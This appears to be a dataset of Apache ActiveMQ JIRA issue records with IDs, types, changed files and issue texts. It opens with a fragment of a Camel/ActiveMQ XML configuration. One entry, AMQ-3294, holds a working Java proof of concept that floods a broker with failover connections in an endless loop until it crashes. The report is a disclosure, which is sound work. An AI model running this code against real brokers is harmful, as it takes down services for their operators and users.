id="txManager" interface="org.springframework.transaction.PlatformTransactionManager"/>    <!-- Transaction POLICY used by Camel Transactional Route         We refer to the ServiceMiX TxManager -->    <bean id="PROPAGATION_REQUIRED" class="org.apache.camel.spring.spi.SpringTransactionPolicy">       <property name="transactionManager" ref="txManager"/>    </bean>    <bean id="activemq" class="org.apache.activemq.camel.component.ActiveMQComponent">        <!-- <property name="configuration" ref="jmsConfig"/> -->        <property name="connectionFactory">            <osgi:reference interface="javax.jms.ConnectionFactory"/>        </property>        <property name="transactionManager" ref="txManager"/>        <property name="transacted" value="true"/>        <property name="cacheLevel" value="0" />    </bean>    <camelContext id="camel" xmlns="http://camel.apache.org/schema/spring">        <route id="queue-create-incident">            <from uri="activemq:queue:incident"/>            <transacted ref="PROPAGATION_REQUIRED"/>            <log message=">>> Incident received : ${body}"/>            <bean ref="processIncident" method="saveReport"/>            <!-- <bean ref="processIncident" method="generateError"/> -->            <log message=">>> Record inserted : ${body}"/>        </route>2) ActiveMQ    <bean id="activemqConnectionFactory" class="org.apache.activemq.ActiveMQXAConnectionFactory">        <property name="brokerURL" value="tcp://localhost:61616" />        <property name="redeliveryPolicy" ref="redeliveryPolicy"/>    </bean>    <bean id="pooledConnectionFactory" class="org.apache.activemq.pool.XaPooledConnectionFactory">        <property name="maxConnections" value="8" />        <property name="connectionFactory" ref="activemqConnectionFactory" />        <property name="transactionManager" ref="transactionManager"/>    </bean>    <bean id="redeliveryPolicy" class="org.apache.activemq.RedeliveryPolicy">        <property name="maximumRedeliveries" value="0"/>    </bean>    <reference id="transactionManager" interface="javax.transaction.TransactionManager" />    <service ref="pooledConnectionFactory" interface="javax.jms.ConnectionFactory">        <service-properties>            <entry key="name" value="localhost"/>        </service-properties>    </service>
issueID:AMQ-3253
type:Improvement
changed files:
texts:Support Temporary Destinations in a network without advisories
Typically network require advisory message to allow peer broker to know about dynamic destination and consumer creation. However the advisory overhead can be significant as the numbers of peer brokers in a network increase to double digits.A statically configured network can exist without advisories but using request reply with temporary currently destinations fails: a) because there is no way to configure them as statically included as their generated name is dynamically created from a connectionId and does not contain a wild card separator ".". b) it is not possible to auto create a temp destination by a replying message producer (AMQ-2571)Some discussion at: http://mail-archives.apache.org/mod_mbox/activemq-users/201103.mbox/%3CAANLkTi=N3LaQ4AWP8hK48OYAgWpSVodvjw4AN57j3+vz@mail.gmail.com%3E
issueID:AMQ-3259
type:Improvement
changed files:
texts:Building with NetBeans 7.0 RC1 (w/ Maven 3.0.3) exposed malformed projects.
The following text was displayed during the build process with NetBeans 7.0 RC1:"Some problems were encountered while building the effective model for org.apache.activemq:activemq-fileserver:war:5.5.0The expression ${pom.groupId} is deprecated. Please use ${project.groupId} instead.The expression ${pom.groupId} is deprecated. Please use ${project.groupId} instead.Some problems were encountered while building the effective model for org.apache.activemq:activemq-web-demo:war:5.5.0The expression ${pom.groupId} is deprecated. Please use ${project.groupId} instead.Some problems were encountered while building the effective model for org.apache.activemq:activemq-xmpp:jar:5.5.0"repositories.repository.layout" for maven-repository.dev.java.net uses the unsupported value "legacy", artifact resolution might fail. @ line 42, column 15"pluginRepositories.pluginRepository.layout" for maven-repository.dev.java.net uses the unsupported value "legacy", artifact resolution might fail. @ line 55, column 15It is highly recommended to fix these problems because they threaten the stability of your build.For this reason, future Maven versions might no longer support building such malformed projects."Can these minor issues be resolved?
issueID:AMQ-3260
type:Improvement
changed files:JaasCertificateCallbackHandler.java
texts:Javadoc refinements are necessary as exposed by the ActiveMQ build process
Javadoc refinements are necessary as exposed by the ActiveMQ build processNote that these refinements are trivial in nature and the only downside in performing the improvements is the time and commitment to make the changes.The benefits include a better Javadoc documentation set and removal of the warnings from the detailed build process.I will include the Javadoc related warnings seen in the build process as an attached comment.
issueID:AMQ-3261
type:Bug
changed files:
texts:setup writes incorrect jmx port
See http://activemq.2283324.n4.nabble.com/Setup-writes-wrong-default-JMX-port-td3425002.html for the question and request for JIRA issue.Change the line:ACTIVEMQ_SUNJMX_START="-Dcom.sun.management.jmxremote.port=11099 "toACTIVEMQ_SUNJMX_START="-Dcom.sun.management.jmxremote.port=1099 "Then remove the "--jmxurlservice:jmx:rmi:///jndi/rmi://127.0.0.1:11099/jmxrmi " from the ACTIVEMQ_SUNJMX_CONTROL to make restarts and queries work without erroring.
issueID:AMQ-3262
type:Bug
changed files:
texts:Browser closed while iterating changes message delivery order
When you close the queue browser before you iterated through all messages, it will mark those unbrowsed messages as not consumed and they will be dispatched first to the next consumer.This changes the original delivery order of messages.Message browser should not change message delivery order in any way.
issueID:AMQ-3263
type:Improvement
changed files:LoggingBrokerPlugin.java
texts:ActiveMQ LoggingBrokerPlugin too verbose
Hi all, I am using Apache ActiveMQ v5.4.2-fuse-02-00 and I want to log events related connections and added following line into my config<loggingBrokerPlugin logAll="false" logConnectionEvents="true"/>but now in my log I have a lot of noise because it enabled also events related to sessions:  2011-03-23 12:58:55,861 | INFO | Adding Connection : ConnectionInfo {commandId = 1, responseRequired = true, connectionId = ID:comunalserver-3451-634364032937500000-1:1141, clientId = ID:comunalserver-3451-634364032937500000-1142:0, userName = epaybroker, password = *****, brokerPath = null, brokerMasterConnector = false, manageable = false, clientMaster = false, faultTolerant = false} | org.apache.activemq.broker.util.LoggingBrokerPlugin | ActiveMQ Transport: ssl:///81.89.210.236:29722011-03-23 12:58:55,903 | INFO | Adding Session : SessionInfo {commandId = 2, responseRequired = false, sessionId = ID:comunalserver-3451-634364032937500000-1:1141:1} | org.apache.activemq.broker.util.LoggingBrokerPlugin | ActiveMQ Transport: ssl:///81.89.210.236:29722011-03-23 12:58:56,517 | INFO | Removing Session : SessionInfo {commandId = 71563, responseRequired = false, sessionId = ID:test.customs.am-28506-1300862663044-0:2:15904} | org.apache.activemq.broker.util.LoggingBrokerPlugin | ActiveMQ Transport: ssl:///192.168.0.30:212582011-03-23 12:58:56,517 | INFO | Removing Session : SessionInfo {commandId = 71572, responseRequired = false, sessionId = ID:test.customs.am-28506-1300862663044-0:3:15906} | org.apache.activemq.broker.util.LoggingBrokerPlugin | ActiveMQ Transport: ssl:///192.168.0.30:212592011-03-23 12:58:56,518 | INFO | Adding Session : SessionInfo {commandId = 71570, responseRequired = false, sessionId = ID:test.customs.am-28506-1300862663044-0:2:15905} | org.apache.activemq.broker.util.LoggingBrokerPlugin | ActiveMQ Transport: ssl:///192.168.0.30:212582011-03-23 12:58:56,518 | INFO | Removing Session : SessionInfo {commandId = 71570, responseRequired = false, sessionId = ID:test.customs.am-28506-1300862663044-0:2:15905} | org.apache.activemq.broker.util.LoggingBrokerPlugin | ActiveMQ Transport: ssl:///192.168.0.30:212582011-03-23 12:58:56,518 | INFO | Adding Session : SessionInfo {commandId = 71572, responseRequired = false, sessionId = ID:test.customs.am-28506-1300862663044-0:2:15906} | org.apache.activemq.broker.util.LoggingBrokerPlugin | ActiveMQ Transport: ssl:///192.168.0.30:21258................................................I"ve prepared patch to add additional flag "logSessionEvents" to have more control what to log. Thanks.
issueID:AMQ-3268
type:Improvement
changed files:XBeanBrokerFactory.java
SpringSslContext.java
Utils.java
texts:Cannot use <SslContext> tag in blueprint configuration
Couldn"t use the <SslContext> tag in blueprint configuration: setting a string attribute of the SslContext element resulted in the error "Cannot convert String to Spring Resource type" when I tried to use it in a blueprint file. It turns out that the Java source defines the property to be of Spring Resource type, not String.Pulling the Resource type out of the api and pushing it into the implementations will keep the schema String type matching the api which is more natural and will work easily with blueprint.
issueID:AMQ-3269
type:Bug
changed files:
texts:ACTIVEMQ_OPTS_MEMORY is ignored
I have just realised that my brokers were running with 256M of ram, which given they used to operate on 512M raised concerns. Checking my /etc/default/activemq file I do have:ACTIVEMQ_OPTS_MEMORY="-Xms512M -Xmx512M"If I echo out the result of ACTIVEMQ_OPTS within the init.d script (linked to /opt/activemq/bin/activemq) I see only the default 256M resolved.Only way I was able to up the limit was by editing the init script and replacing the default value with my own.Marking this as a regression as I am 99% sure this was working in 5.4.x.
issueID:AMQ-3272
type:Bug
changed files:KahaDBStore.java
texts:Handle RejectedExecutionException
Under heavy load, the async task executor in kahadb can throw RejectedExecutionException meaning it can"t accept more tasks.Thread pool executor has RejectedExecutionHandler that deals with these situations and by default it aborts the task and throws the exception. I think it"s much better to use ThreadPoolExecutor.CallerRunsPolicy which will try to execute the task in the current thread and thus sync the execution.
issueID:AMQ-3273
type:Bug
changed files:ControlFile.java
LockFile.java
KahaStore.java
IndexManager.java
AMQPersistenceAdapter.java
texts:Slave broker acquires lock file when Master is still alive (shared file system master/slave setup)
The change introduced in AMQ-3237 has triggered issue with LockFile.lock() on Win7 and Win2k8. See comments to the JRE issue http://bugs.sun.com/view_bug.do?bug_id=6628575 (bottom of the page).  Suggested solution is to use this construction instead:fc.lock( 0, Math.max( 1, fc.size() ), false );
issueID:AMQ-3274
type:Bug
changed files:
texts:duplicate messages on Temporary Topics in network of brokers
Creating a network of brokers, duplicate messages are being seen on Temporary Topics.The network configuration used is as follows:        <networkConnectors>                <networkConnector name="nw1_queues_from_nw2" uri="static:(tcp://127.0.0.1:60002)"                                  duplex="true" conduitSubscriptions="false" dynamicOnly="true"                                  networkTTL="7" suppressDuplicateQueueSubscriptions="true"                                  decreaseNetworkConsumerPriority="true"                                  bridgeTempDestinations="true"                                  >                        <excludedDestinations>                                <topic physicalName=">" />                        </excludedDestinations>                </networkConnector>                <networkConnector name="nw1_topics_from_nw2" uri="static:(tcp://127.0.0.1:60002)"                                  duplex="true" conduitSubscriptions="true" dynamicOnly="true"                                  networkTTL="7" suppressDuplicateQueueSubscriptions="true"                                  decreaseNetworkConsumerPriority="true"                                  bridgeTempDestinations="true"                                  >                        <excludedDestinations>                                <queue physicalName=">" />                        </excludedDestinations>                </networkConnector>    </networkConnectors>Note there are 2 duplex connections between the brokers.  Changing to non-duplex connections, the problem goes away with 2 brokers in the network, but reappears when a 3rd broker is added.The problem only affects temporary Topics; normal Topics work fine.A patch will be attached.  Also, a test case will be attached when it is available.
issueID:AMQ-3275
type:Bug
changed files:
texts:Make UDP protocol work
factory = new ActiveMQConnectionFactory("udp://localhost:61618");connection = factory.createConnection();connection.start();Connection.start() seems to trigger an infinite loop in ReliableTransport.request(Object).
issueID:AMQ-3276
type:Bug
changed files:TransportConnector.java
DemandForwardingBridgeSupport.java
BrokerService.java
DedicatedTaskRunner.java
PooledTaskRunner.java
DeterministicTaskRunner.java
TransportConnection.java
SimpleDiscoveryAgent.java
MDCHelper.java
texts:ConcurrentModificationException in embedded 5.5.0 broker
We just migrated from ActiveMQ 5.4.2 to ActiveMQ 5.5.0.  So far so good, with one exception (pun not intended).  In one case where we have an embedded broker, we"re seeing this exception get logged on occasion:WARNING; 08-Apr-2011 11:11:41; tid:45931; TransportConnection stopAsync; cannot create async transport stopper thread.. not waiting for stop to complete, reason:java.util.ConcurrentModificationException        at java.util.HashMap$HashIterator.nextEntry(HashMap.java:793)        at java.util.HashMap$EntryIterator.next(HashMap.java:834)        at java.util.HashMap$EntryIterator.next(HashMap.java:832)        at java.util.HashMap.putAllForCreate(HashMap.java:435)        at java.util.HashMap.<init>(HashMap.java:225)        at org.slf4j.helpers.BasicMDCAdapter.getCopyOfContextMap(BasicMDCAdapter.java:130)        at org.slf4j.MDC.getCopyOfContextMap(MDC.java:182)        at org.apache.activemq.util.MDCHelper.getCopyOfContextMap(MDCHelper.java:30)        at org.apache.activemq.broker.TransportConnection.stopAsync(TransportConnection.java:946)        at org.apache.activemq.broker.TransportConnection.processShutdown(TransportConnection.java:353)        at org.apache.activemq.command.ShutdownInfo.visit(ShutdownInfo.java:35)        at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:306)        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:179)        at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:116)        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69)        at org.apache.activemq.transport.vm.VMTransport.iterate(VMTransport.java:218)        at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:127)        at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:48)        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)        at java.lang.Thread.run(Thread.java:662)Up until this morning, I had only seen that logged during shutdown of the app context.  But just now, it popped out independently, out of the blue.For what it"s worth, here"s the app context config:  <broker xmlns="http://activemq.apache.org/schema/core"          id="embeddedActivemqBroker"          useJmx="true"          persistent="true"          schedulerSupport="false"          advisorySupport="false"          enableStatistics="true">    <destinationPolicy>      <policyMap>        <policyEntries>          <policyEntry queue=">" producerFlowControl="false" memoryLimit="20mb"/>        </policyEntries>      </policyMap>    </destinationPolicy>    <persistenceAdapter>      <kahaDB directory="${EmbeddedBroker.dataDirectory}"              concurrentStoreAndDispatchQueues="false"/>    </persistenceAdapter>  </broker>Has anybody else seen this ConcurrentModificationException happening with 5.5.0 (or otherwise)?  Any ideas?I suppose I should also mention that we"re using slf4j 1.6.1.  Not sure if that has anything to do with this, since the stack trace does show it happening in slf4j land...    <dependency>      <groupId>org.slf4j</groupId>      <artifactId>slf4j-api</artifactId>      <version>1.6.1</version>      <scope>runtime</scope>    </dependency>    <dependency>      <groupId>org.slf4j</groupId>      <artifactId>slf4j-jdk14</artifactId>      <version>1.6.1</version>      <scope>runtime</scope>    </dependency>
issueID:AMQ-3278
type:Bug
changed files:
texts:CRON scheduling does not work correctly
I have a listener with an event handler listening for messages and logging when they come in.I sent a message to that queue with CRON string of "25 * * * *".  All other scheduler properties are not set.  No ttl.The first time 25 after the hour comes around, a message is sent and my listener receives it.All subsequent times 25 after the hour come around, the listener doesn"t receive anything.The admin console Queues page shows that the subsequent messages are waiting in the queue but drilling into the queue shows no message.Restarting ActiveMQ and the Queues page doesn"t show any messages.
issueID:AMQ-3280
type:New Feature
changed files:
texts:Add support for message selectors and message headers in maven-activemq-perf-plugin.
The maven ActiveMQ performance plugin can be used as a general test framework. It currently lacks support for specifying message selectors in the consumer. I request this support to be added and attach a possible implementation. In this implementation, the consumer additionally supports the following configuration option:-Dconsumer.messageSelector="MyHeader = "MyValue" AND JMSType = "car""You can specify message selector criterias, as explained in http://activemq.apache.org/selectors.html. However this implementation only supports header based criterias. In order to produce messages that match the message selector of the consumer it is necessary to also extend the producer to support message headers. On the producer side message headers can be specified using this arguments-Dproducer.header="JMSType=car:MyHeader=MyValue"whereby each header follows the syntax name=value and multiple headers can be separated using ":" on the same line. There can only be one occurrence of -Dproducer.header. If multiple are specified, they will override each other. Hence multiple headers need to be separated by ":"The sample message header configuration of the producer above will match the message selector configuration of the consumer above.If this patch gets accepted, the documentation of the maven-activemq-perf-plugin needs to be updated as well.
issueID:AMQ-3282
type:Bug
changed files:
texts:The wrapper.conf shipped in the linux-x86-32 and linux-x86-64 incorrectly specifies libwrapper.so
The wrapper.conf in the ./bin/linux-x86-32 and ./bin/linux-x86-64 directories incorrectly specifies libwrapper.so:# Java Library Path (location of Wrapper.DLL or libwrapper.so)wrapper.java.library.path.1=%ACTIVEMQ_HOME%/bin/linux/There is no linux directory, just the ones for 32 and 64 bit versions specifically.
issueID:AMQ-3283
type:Bug
changed files:JmsClientProperties.java
JmsProducerClient.java
AbstractJmsClient.java
JmsConsumerClient.java
texts:Support for transactions broken in maven-activemq-perf-plugin
The doc of the maven-activemq-perf-plugin lists these options:producer.sessTransactedconsumer.sessTransactedHowever they don"t work. Nowhere in the code is a commit() for the transaction.
issueID:AMQ-3284
type:Bug
changed files:StompSocket.java
texts:WebSockets and truncated body
In WebSocket transport, StompSocket class calls StompFrame.toString() instead StompFrame.format(). Because of this, some frames can be truncated.
issueID:AMQ-3285
type:Bug
changed files:
texts:ActiveMQXAConnectionFactory does not respect various parameters for redelivery policy
I tried to add these following parameters to my redelivery policy and activeMQ is not respecting any of them except maximumRedelivery<spring:bean id="redeliveryPolicy" class="org.apache.activemq.RedeliveryPolicy">   <spring:property name="maximumRedeliveries" value="5"/>   <spring:property name="initialRedeliveryDelay" value="5000"/>      <spring:property name="redeliveryDelay" value="2000"/>   <spring:property name="useExponentialBackOff" value="true"/>   <spring:property name="backOffMultiplier" value="2"/>  </spring:bean>I have attached the project which I took from https://issues.apache.org/jira/browse/AMQ-1593 and added the above parameter to my brokerURL:tcp://localhost:5000?jms.redeliveryPolicy.maximumRedeliveries=3&jms.redeliveryPolicy.initialRedeliveryDelay=10000&jms.redeliveryPolicy.deliveryDelay=10000&jms.redeliveryPolicy.useExponentialBackOff=true&jms.redeliveryPolicy.backOffMultiplier=2This test case will show you that none of the parameters like initiaRedeliveryDelay etc will take effect, except maxRedeliveries
issueID:AMQ-3288
type:Bug
changed files:DefaultJDBCAdapter.java
texts:JDBC persistence adapter, intermittent performance degradation when a durable subscriber of priority messages falls behind
Scenario: Messages are produced with rolling priority - jmsPriority = sendCount%10 so there are always high priority messages in the mix.One durable client attempting to catch up when being behind by 100k messages.Symptom: About the time the priority of messages being consumed switched from 9, to 8, the delay happened. Why it was happening, the log scrolled very fast with the percentage of memory use change debug command. Delivery was suspended.This happened for about a minute or so. During this time, one cleanup timer tripped, there wasn"t any delay for the cleanup sql.It was strange, before the delay, the warning about memory stayed around 100% or so, but during the delay, it jumped up to 4000%.
issueID:AMQ-3289
type:Bug
changed files:BlobJDBCAdapter.java
texts:ActiveMQ has problems storing >4K messages in Oracle
The oracle persistence adapter extends the blob jdbc adapter but it has gotten out of sync with the method overrides. @Override to the rescue for the future.The blob adapter uses native blob streaming to insert data (which can accommodate > 4k) but it has been out of step for some time.The implementations need to be brought into line w.r.t to the api, schema and locking.
issueID:AMQ-3292
type:Bug
changed files:Transaction.java
texts:KahaDb Transaction iterator remove doesn&#39;t throw Runtime Exception
None
issueID:AMQ-3294
type:Bug
changed files:
texts:ActiveMQ failover Denial of Service
Abusing the "failover" feature in ActiveMQ, an unauthenticated user can trigger a Denial of Service condition against the broker service. In detail, an attacker can issue multiple ActiveMQ openwire connection requests using the following connection string:  failover:tcp://<IP>:61616Due to the "failure" mechanism, all TCP connections remain active even if a valid session is not created. Please note that no valid credentials have been used. After a few thousand requests, a "java.net.SocketException: Too many open files" exception is triggered causing the freeze/crash of the broker. Connected systems may crash as well. During my test, the attack took around 4 minutes (in a local network) and it is highly reliable. This is most likely an abuse of the "failover" functionality.I"ve been testing version 5.2.0 and also the latest 5.5.0 release. As both releases are affected, I assume that this issue is present in other versions as well. The problem appears in the default configuration as well as with different authentication plugins enabled.Proof-Of-Concept:--------------------package openwireclient;import javax.jms.*;import org.apache.activemq.ActiveMQConnectionFactory;public class GoAndCrash {    private static String url = "failover:tcp://";    public static void main(String[] args) throws JMSException {        System.out.println("
--[ ActiveMQ Denial of Service PoC ]
");        url = url.concat(args&#91;0&#93; + ":" + args&#91;1&#93;);        int cont = 0;        while (true) {            try {                System.out.println("[*] Request #" + cont);                ConnectionFactory connectionFactory = new ActiveMQConnectionFactory("invalidUser", "invalidPass", url);                Connection connection = connectionFactory.createConnection();                cont++;                connection.start();            } catch (Exception ex) {               //do nothing            }        }    }}--------------------
issueID:AMQ-3297
type:Improvement
changed files:
texts:add xtream necessary bundles to activemq-karaf/features.xml
activemq-core bundle optionally import xtream package likecom.thoughtworks.xstream, so by default in activemq feature there"s no xtream necessary bundles, but as xtream functionality in activemq is popularly used(such like it used by stomp), so I think add those optional bundles also should be good
issueID:AMQ-3298
type:New Feature
changed files:JmsTopicConnector.java
JmsQueueConnector.java
JmsConnector.java
texts:Cannot create bridge to WebSphere queue using default messaging provider
I am attempting to configure a queue-to-queue bridge from ActiveMQ to a queue in WebSphere 7.  The WebShere queue used the internal "default messaging provider". The bridge configuration provides the JNDI name for the queue.In the ActiveMQ JmsQueueConnector.createForeignQueue method, the queue is created using:        try {            result = session.createQueue(queueName);        } catch (JMSException e) {            // look-up the Queue            try {                result = (Queue)jndiOutboundTemplate.lookup(queueName, Queue.class);                ...Unfortunately, the Session.createQueue method in the WebSphere connector does not throw an exception at this point; instead a Queue object is created which cannot be used for message transmission.  Ideally there would be a configuration option which bypasses the createQueue call and goes direct to the JNDI lookup.Or try the JNDI approach first and fallback to createQueue?
issueID:AMQ-3300
type:Improvement
changed files:
texts:Add support for soWriteTimeout and soTimeout to ssl transport
SSLTransport overrides compositeConfigure and misses out on some of the base class implementation options. The override needs to delegate to super.
issueID:AMQ-3301
type:Bug
changed files:LockFile.java
texts:LockFile in-jvm check is not thread-safe
kahadb/src/main/java/org/apache/kahadb/util/LockFile.java adds in-JVM locking to Channel.tryLock() using system properties.  However, there is time between the read-and-check for an existing lock and setting a new lock.I found this problem while running multiple brokers in a single JVM for diagnostic purposes with two brokers using a shared directory to simlute a production H/A environment.
issueID:AMQ-3303
type:Bug
changed files:RemoteJMXBrokerFacade.java
texts:Standalone Webconsole crashes when accessing master-slave failover activeMQ
Null pointer exception when accessing the JSPs if the first jmx server (here activemq-1) in the jmx url is the slave.findBrokers in RemoteJMXBrokerFacade finds the slave broker but accessing some of its attributes results in a NullPointerException.
issueID:AMQ-3305
type:Improvement
changed files:
texts:Implement "exactly once" delivery with kahaDB and XA in the event of a failure post prepare
With XA 2PC, a camel route, jms "to" jdbc should ensure exactly once delivery to jdbc. In the event of a failure after prepare, where commit to jdbc is done, the jms message must remain with a pending ack till the commit outcome is relayed from the transaction manager.Current versions of geronimo will correctly retry the commit in a timer thread, so activemq eventually gets the commit outcome after recovery. (btw: it looks like howl will not persist a commit outcome per NamedXAResource, so after a failure of the TM it may consier the transaction completed and the message may still be pending, need to check that!)At the moment, ActiveMQ does a heuristic rollback after recovery which leads to message redelivery in error.With the fix, an acked message remains pending awaiting the outcome. On commit, the message is acked. On rollback the message is available for redelivery.
issueID:AMQ-3306
type:Bug
changed files:
texts:Cron parser doesn&#39;t understand &#39;?&#39;
See e.g. http://en.wikipedia.org/wiki/Cron#Special_Characters for what "?" is used for.
issueID:AMQ-3308
type:Improvement
changed files:UserPrincipal.java
PropertiesLoginModule.java
TextFileCertificateLoginModule.java
CertificateLoginModule.java
JassCredentialCallbackHandler.java
LDAPLoginModule.java
GuestLoginModule.java
GroupPrincipal.java
JaasCertificateCallbackHandler.java
texts:Minor code improvements in jaas module
Making code more type-safe using java6 features.
issueID:AMQ-3310
type:Bug
changed files:
texts:IOException PListStore "Could not locate data file" from FilePendingMessageCursor
Corruption of the temp store used by file pending message cursors due to removal of data files in error. Contention over reference counts and async writes. Reproducible under heavy load with many concurrent consumers.java.lang.RuntimeException: java.io.IOException: Could not locate data file ./tmp_storage/db-332.log        at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor$DiskIterator.<init>(FilePendingMessageCursor.java:486)        at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.reset(FilePendingMessageCursor.java:129)        at org.apache.activemq.broker.region.Queue.doPageInForDispatch(Queue.java:1712)        at org.apache.activemq.broker.region.Queue.pageInMessages(Queue.java:1932)        at org.apache.activemq.broker.region.Queue.iterate(Queue.java:1440)        at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:104)        at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:42)Caused by: java.io.IOException: Could not locate data file ./tmp_storage/db-332.log        at org.apache.kahadb.journal.Journal.getDataFile(Journal.java:350)        at org.apache.kahadb.journal.Journal.read(Journal.java:597)        at org.apache.activemq.store.kahadb.plist.PListStore.getPayload(PListStore.java:337)        at org.apache.activemq.store.kahadb.plist.PList.getFirst(PList.java:280)        at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor$DiskIterator.<init>(FilePendingMessageCursor.java:482)
issueID:AMQ-3312
type:Bug
changed files:
texts:Queue&#39;s moveMatchingMessagesTo method is extremely slow to the point of being unusable as Queue size increases
Symptom=======We have a system based on ActiveMQ that stores messages in a non-peristent queue.  Frequently, we have to move a specific message from this queue to another queue.  The message to be moved may be anywhere in the queue, and is identified by a selector on a custom JMS integer property.To facilitate the selection and move, we use org.apache.activemq.broker.region.Queue#moveMatchingMessagesTo(ConnectionContext context, String selector, ActiveMQDestination dest)We"ve found that once our queue grows past 10K messages, moving a single message takes over 10s.  When the queue grows past 20K messages, a move takes 70s.  It"s clear from testing that the time to move a message grows exponentially as the queue size increases, to the point that moveMatchingMessagesTo becomes unusable.Cause=====AMQ 5.5.0 has this implementation for moveMatchingMessagesTo:Queue#moveMatchingMessagesTo(ConnectionContext context, MessageReferenceFilter filter    public int moveMatchingMessagesTo(ConnectionContext context, MessageReferenceFilter filter,            ActiveMQDestination dest, int maximumMessages) throws Exception {        int movedCounter = 0;        Set<QueueMessageReference> set = new CopyOnWriteArraySet<QueueMessageReference>();        do {            doPageIn(true);            pagedInMessagesLock.readLock().lock();            try{                set.addAll(pagedInMessages.values());            }finally {                pagedInMessagesLock.readLock().unlock();            }            List<QueueMessageReference> list = new ArrayList<QueueMessageReference>(set);            for (QueueMessageReference ref : list) {                if (filter.evaluate(context, ref)) {                    // We should only move messages that can be locked.                    moveMessageTo(context, ref, dest);                    set.remove(ref);                    if (++movedCounter >= maximumMessages && maximumMessages > 0) {                        return movedCounter;                    }                }            }        } while (set.size() < this.destinationStatistics.getMessages().getCount() && set.size() < maximumMessages);        return movedCounter;    }In the context that we use, maximumMessages is Integer.MAXINT:moveMatchingMessagesTo(ConnectionContext context, String selector, ActiveMQDestination dest)    public int moveMatchingMessagesTo(ConnectionContext context, String selector, ActiveMQDestination dest)            throws Exception {        return moveMatchingMessagesTo(context, selector, dest, Integer.MAX_VALUE);    }Since moveMatchingMessagesTo instantiates the set variable as a CopyOnWriteArraySet, each doPageIn loop creates a new array, copies the existing set members, and then linearly scans the array for the insertion.  The result is that moveMatchingMessagesTo is an O(n^2) algorithm with respect to message copying, where n is the size of the queue.Solution========set is scoped to a single call of moveMatchingMessagesTo, and is only accessed by a single thread, so there is no benefit to using CopyOnWriteArraySet.  Simply changing set to a HashSet prevents the need for the doPageIn loop to copy the set on each iteration, and insertion becomes an O(1) operation.Attached is a unit test that demonstrates how moving the last message from a queue of 10K messages takes 8s (on our machine).  Included is a patch Queue that changes set from a CopyOnWriteArraySet to a HashSet; with this patch, the same unit test completes in under 200ms.
issueID:AMQ-3314
type:Bug
changed files:
texts:FilePendingMessageCursor isFull reports full in error when temp store is full, even if not needing the temp store
With slow queue consumers of non persistent messages the temp store can be filled and producers blocked. The default cursor for non persistent is a fileCursor. However topic subs with a pending message limit strategy also use a cursor for pending messages. If there is sufficient memory resources, the topic consumers should be able to operate without recourse to the temp store. At the moment this is not the case, as the check to isFull reports true in error (based on the status of the temp store)It should only report full if its memory is exhausted || it is spooling to disk AND the temp store is exhausted.
issueID:AMQ-3315
type:Improvement
changed files:
texts:Allow socket option soLinger to be enabled on TcpTransport
soLinger as a socket option takes two args so it cannot be set via the simple socket option introspection. It needs an attribute on TcpTransport. It is handy for stomp where connections are short lived as it can increase the socket.close() turnaround when set to 0.
issueID:AMQ-3316
type:Bug
changed files:ConnectionStateTracker.java
texts:Memory leak in ConnectionStateTracker with MessagePull objects
We discovered a memory leak in ConnectionStateTracker in case a long-lived connection with prefetch=0 is used.If prefetch=0 is used, MessagePull objects are enqueued in messageCache with an estimated size of 400. But in the cache"s removeEldestEntry() method no size is subtracted from currentCacheSize for MessagePull instances. This messes with the cache as it will continue to remove objects even if there is space in the cache. But after about 5,368,709 consumed messages this will cause the currentCacheSize to roll-over maximum integer and become negative. As a consequence, for the next about 5,368,709 no messages will be removed from the cache any longer.This sooner or later will trigger out-of-memory conditions, depending on the size of the various pools. In our case this caused out-of-memory in PermGen first, as message IDs seem to be internalized, and PermGen is considerably smaller than the heap.
issueID:AMQ-3319
type:Bug
changed files:Queue.java
texts:A possible browsing concurrency issue in org.apache.activemq.broker.region.Queue
Some time ago clients of our ActiveMQ instance locked up while browsing. Analysis of the log files showed a large amount of: java.util.NoSuchElementException at java.util.LinkedList.remove(LinkedList.java:788) at java.util.LinkedList.removeFirst(LinkedList.java:134) at org.apache.activemq.broker.region.Queue.getNextBrowserDispatch(Queue.java:1341) at org.apache.activemq.broker.region.Queue.iterate(Queue.java:1463) at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122) at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43) at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908) at java.lang.Thread.run(Thread.java:637)Happening before lockup.It seems there is a problem in Queue class, which uses non thread safe LinkedList collection. Additions and removals to/from this collection are wrapped by a shared readLock, which means there is no guard against concurrent modification and there is also a possibility of a race condition between isEmpty and removeFirst call during concurrent usages of getNextBrowserDispatch (if they are possible).I think the easiest fix is to switch from LinkedList to ConcurrentLinkedQueue and make use of Queue methods to access the collection (because they allow single step isEmpty/remove call). I am attaching a patch that does it. I"ve left the readLocks in case they are used to block writes someplace else, but they are not needed anymore for concurrency control over the new collection.
issueID:AMQ-3321
type:New Feature
changed files:Krb5AndCertsSslSocketConnector.java
HttpsTransportServer.java
texts:Add kerberos authentication support for transport over https
For Https currently only certificate based authentication is possible. Enable Kerberos based authentication for Https transport.
issueID:AMQ-3322
type:Improvement
changed files:
texts:Minor code improvements in security module
Genrify code to improve compile time safety.
issueID:AMQ-3323
type:Improvement
changed files:
texts:LDAPLoginModule - more debugging and info in exceptions
Setting LDAP auth can be tricky, so we need to provide more debug info to ease the process. Also, exceptions returned always point to "LDAP error" no matter why auth fails.
issueID:AMQ-3324
type:Bug
changed files:
